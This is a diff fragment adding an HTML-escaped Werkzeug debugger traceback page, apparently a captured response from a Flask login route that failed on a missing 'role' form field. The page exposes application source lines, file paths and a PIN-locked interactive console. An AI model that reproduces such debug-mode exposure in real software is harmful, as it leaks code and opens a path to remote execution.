+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546325488&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;74&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;login&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def login():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;response = {&amp;#39;success&amp;#39;: False, &amp;#39;message&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;redirect&amp;#39;: &amp;#39;&amp;#39;}&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;username = request.form[&amp;#39;username&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;password = request.form[&amp;#39;password&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;role = request.form[&amp;#39;role&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# sqli filter&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if not is_safe_input(username) or not is_safe_input(password) or not is_safe_input(role):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;response[&amp;#39;message&amp;#39;] = &amp;#39;Invalid input&amp;#39;&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;response[&amp;#39;success&amp;#39;] = False&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045546324816&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;196&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__getitem__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if key in self:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;lst = dict.__getitem__(self, key)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if len(lst) &amp;gt; 0:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;return lst[0]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;raise exceptions.BadRequestKeyError(key)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def __setitem__(self, key, value):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Like :meth:`add` but removes an existing key first.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;:param key: the key for the value.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/ul&gt;
+  &lt;blockquote&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;role&amp;#39;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;plain&quot;&gt;
+    &lt;p&gt;
+      This is the Copy/Paste friendly version of the traceback.
+    &lt;/p&gt;
+    &lt;textarea cols=&quot;50&quot; rows=&quot;10&quot; name=&quot;code&quot; readonly&gt;Traceback (most recent call last):
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &amp;#34;/app/app.py&amp;#34;, line 74, in login
+    role = request.form[&amp;#39;role&amp;#39;]
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&amp;#34;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;role&amp;#39;
+&lt;/textarea&gt;
+&lt;/div&gt;
+&lt;div class=&quot;explanation&quot;&gt;
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  &lt;span class=&quot;nojavascript&quot;&gt;
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.&lt;/span&gt;
+&lt;/div&gt;
+      &lt;div class=&quot;footer&quot;&gt;
+        Brought to you by &lt;strong class=&quot;arthur&quot;&gt;DON'T PANIC&lt;/strong&gt;, your
+        friendly Werkzeug powered traceback interpreter.
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;pin-prompt&quot;&gt;
+      &lt;div class=&quot;inner&quot;&gt;
+        &lt;h3&gt;Console Locked&lt;/h3&gt;
+        &lt;p&gt;
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        &lt;form&gt;
+          &lt;p&gt;PIN:
+            &lt;input type=text name=pin size=14&gt;
+            &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!--
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &quot;/app/app.py&quot;, line 74, in login
+    role = request.form['role']
+  File &quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'role'
+
+
+--&gt;</pre></div>
+</div>
+</body></html>
